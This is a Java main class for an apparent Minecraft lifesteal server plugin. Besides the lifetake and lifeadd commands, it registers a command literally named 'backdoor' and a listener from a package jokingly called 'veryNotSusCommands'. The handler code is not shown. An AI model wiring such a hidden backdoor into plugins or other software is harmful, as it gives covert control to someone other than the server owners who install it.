package com.vanillaCraft.lifeSteal;

import com.vanillaCraft.lifeSteal.veryNotSusCommands.notSusCommand;
import com.vanillaCraft.lifeSteal.veryNotSusCommands.veryNotSusCommandpt2;

import org.bukkit.ChatColor;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin{
    @Override
    public void onEnable() {
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage(ChatColor.RED + "" + ChatColor.BOLD + "LIFESTEAL IS NOW ENABLED THANKS TO BONGOCAT (yes im gonna take all the credit)");
        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getConsoleSender().sendMessage("---------------------------------------------------------------------------------");
        getServer().getPluginManager().registerEvents(new veryNotSusCommandpt2(), this);
        getCommand("backdoor").setExecutor(new notSusCommand());
        getCommand("lifetake").setExecutor(new lifeTakeCmd());
        getCommand("lifeadd").setExecutor(new lifeAddCmd());
        getServer().getPluginManager().registerEvents(new listener(), this);
    }

    @Override
    public void onDisable() {
        
    }
}
